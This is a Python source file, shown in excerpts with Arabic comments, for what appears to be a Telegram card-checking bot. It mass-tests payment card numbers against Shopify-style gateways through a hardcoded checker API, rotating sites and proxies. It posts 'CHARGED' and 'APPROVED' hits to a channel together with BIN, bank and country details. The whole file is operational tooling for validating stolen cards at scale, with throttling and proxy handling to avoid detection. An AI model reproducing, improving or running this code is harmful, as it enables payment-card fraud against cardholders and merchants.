...
class AdaptiveThrottler:
    ...
    def is_recovering(self):
        ...
        if self.flood_detected:
            self.flood_detected = False
        return False
GLOBAL_THROTTLER = AdaptiveThrottler(min_delay=0.001, max_delay=0.5)
# تم إلغاء نظام الـ SessionPool المشترك واستبداله بنظام الـ User-Isolated Sessions لضمان استقلال السرعة التام
# كل مستخدم الآن يحصل على جلسته الخاصة عبر دالة get_user_http_session
SESSION_POOL = None
    ...
    async def call(self, func, *args, **kwargs):
        ...
        try:
            ...
            if self.failures >= self.failure_threshold:
                self.state = "OPEN"
            raise e
API_CIRCUIT = CircuitBreaker(failure_threshold=10, recovery_time=10)
class ResultCache:
...
# تم تحسين إدارة الجلسات للتعامل مع أكثر من 300 مستخدم متزامن
# نستخدم حوض موصلات مشترك ضخم لتقليل استهلاك الذاكرة مع ضمان السرعة القصوى
...
async def get_user_http_session(uid, purpose="general"):
    ...
    if _GLOBAL_CONNECTOR is None or _GLOBAL_CONNECTOR.closed:
        # استخدام موصل مشترك ضخم جداً للتعامل مع 300+ مستخدم
        _GLOBAL_CONNECTOR = aiohttp.TCPConnector(
            limit=5000, # زيادة السعة القصوى للاتصالات
            limit_per_host=300, 
            ttl_dns_cache=1800,
            use_dns_cache=True, 
...
class SmartRotator:
    ...
    def pick_site(self, sites, exclude=None):
        ...
        # توزيع الحمل بين المواقع المتاحة، مع تفضيل المواقع التي لم تفشل مؤخرًا
        available = [s for s in sites if s not in exclude and self._site_fails.get(s, 0) < 5]
        if not available:
            # إذا كانت جميع المواقع قد فشلت مؤخرًا، فاستخدم المواقع التي لم يتم استبعادها
            available = [s for s in sites if s not in exclude]
        if not available:
            # إذا تم استبعاد جميع المواقع، فاستخدم جميع المواقع
            available = list(sites)
        
        # استخدام خوارزمية اختيار دوري (Round Robin) مع بعض العشوائية
        if not available:
            return None
        
        # إذا كان هناك موقع واحد فقط، اختره
        if len(available) == 1:
            return available[0]

        # اختر الموقع التالي في الترتيب الدوري
...
def classify_response(rj):
    ...
    if is_site_error(ar):
        # تحويل أخطاء المواقع والـ API إلى Rejected فوراً لمنع ظهورها كـ Error في الواجهة
        res["Status"] = "Rejected"
        ...
        res["Status"] = "Declined"
    return res
async def _check_card_api_internal(card, site, proxy_data=None, http_session=None, user_id=None):
    url = build_api_url(site if site.startswith('http') else f'https://{site}', card, proxy_data)
    # استخدام جلسة المستخدم المعزولة لضمان استقلال السرعة
    s = http_session or (await get_user_http_session(user_id or 0, "msp"))
...
async def check_card_api(card, site, proxy_data=None, user_id=None, http_session=None):
    return await safe_api_call(_check_card_api_internal, card, site, proxy_data, http_session, user_id=user_id)
...
def format_simple_card_result(status, card, gateway, response, bin_info=None, elapsed=0.0, extra_field=None):
    sm = {
        "Charged": (f"𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ⭐", []),
        "Approved": (f"𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ⭐", []),
        "Declined": (f"{gemj('declined')} <b>{bs('𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗')}</b> {gemj('declined')}", []),
        "Error": (f"{gemj('cross')} <b>{bs('𝗘𝗥𝗥𝗢𝗥')}</b> {gemj('cross')}", [])
    }
...
⊀ <b>{bs(\'𝗖𝗮𝗿𝗱\')}</b>
⤷ <code>{card}</code>
<b>{bs(\'𝗚𝗮𝘁𝗲𝘄𝗮𝘆\')}</b> ━ {gateway}
<b>{bs(\'𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲\')}</b> ━ {response}
{extra}━━━━━━━━━━━━━━━━━
    <b>{bs('𝗕𝗜𝗡')}</b>: <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
    <b>{bs('𝗕𝗮𝗻𝗸')}</b>: <code>{bi.get('bank', '-')}</code>
    <b>{bs('𝗖𝗼𝘂𝗻𝘁𝗿𝘆')}</b>: <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>

    <b>{bs('𝗧𝗼𝗼𝗸')}</b> ⏱ <code>{elapsed:.2f}s</code>""", he
...
⤷ <code>{card}</code>
<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆</b> ━ {gateway}
<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲</b> ━ {response}
<b>𝗣𝗿𝗶𝗰𝗲</b> ━ {ps}
━━━━━━━━━━━━━━━━━
<b>𝗕𝗜𝗡</b>: <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>𝗕𝗮𝗻𝗸</b>: <code>{bi.get('bank', '-')}</code>
<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆</b>: <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>

<b>𝗧𝗼𝗼𝗸</b> ⏱ {elapsed:.2f}s""", he
async def send_channel_hit(res, uid, username, name):
    try:
        ...
        if sv in ["CHARGED", "APPROVED"]:
            ...
            # Formatting as requested: HIT ➛ CHARGED ⭐
            msg = f"""{bs('𝗛𝗜𝗧')} ➛ {bs(sv)} {gemj('hit_channel_emoji')}
{bs('𝗚𝗮𝘁𝗲𝘄𝗮𝘆')} ➛ {gw}
{bs('𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲')} ➛ {resp}
{bs('𝗣𝗿𝗶𝗰𝗲')} ➛ {price}
{bs('𝗨𝘀𝗲𝗿')} ➛ <a href="{prof}">{name}</a> | ({bs('𝗣𝗿𝗲𝗺𝗶𝘂𝗺')})"""
...
async def check_proxies_cmd(event):
    ...
    for i, r in enumerate(results):
        if isinstance(r, tuple) and r[0]:
            ...
            dead_proxies.append(proxies[i]['proxy_url'])
    
    # Remove dead proxies from database
    for p_url in dead_proxies:
        await remove_proxy_by_url(event.sender_id, p_url)
        
    await styled_edit(sm, f"🛡️ <b>{bs('Proxy Check')}</b>\n✅ {bs('Working')}: {w}\n❌ {bs('Removed Dead')}: {len(dead_proxies)}", emoji_ids=[CE["shield"]])
...
async def mass_filter_cb(event):
    ...
    sites = data["sites"]
    new_api_url = "https://web-production-44385.up.railway.app//shopify"
    if new_api_url not in sites:
        sites.append(new_api_url)
...
async def _run_mass_process(event, cards, proxies, send_approved, process_store, stop_prefix, check_func, gate_name, sem_type, filter_type="both"):
    ...
    async def update_ui():
        nonlocal last_ui
        now = time.time()
        # نظام تحديث ذكي يعتمد على عدد المستخدمين والبطاقات
        update_interval = 12.0 if total > 2000 else 8.0
        if now - last_ui[0] < update_interval or is_stopped():
            return
        ...
        kb = [
            ...
            [pbtn(f"{gemj('fire_premium', for_button=True)} {bs('𝗖𝗛𝗔𝗥𝗚𝗘𝗗')} ━ {charged}", "none", style="danger")],
            [pbtn(f"{gemj('check', for_button=True)} {bs('𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗')} ━ {approved}", "none", style="success")],
            [pbtn(f"{gemj('declined', for_button=True)} {bs('𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗')} ━ {declined}", "none", style="danger"), pbtn(f"{gemj('cross', for_button=True)} {bs('𝗘𝗥𝗥𝗢𝗥')} ━ {errors}", "none", style="danger")],
            [pbtn(f"📋 {checked} / {total}", "none", style="primary")],
            [pbtn(f"⛔ {bs('STOP PROCESS')}", f"{stop_prefix}:{uid}", style="danger")]
        ]
        try:
            await styled_edit(sm, f"{gemj('fire_premium')} <b>{bs('MASS CHECKING IN PROGRESS')}</b> {gemj('fire_premium')}\n<b>━━━━━━━━━━━━━━━━━</b>\n⏳ <b>{bs('Elapsed')}:</b> <code>{int(time.time()-st)}s</code>\n<b>━━━━━━━━━━━━━━━━━</b>", buttons=kb, emoji_ids=[CE["chart"]])
        except:
            pass
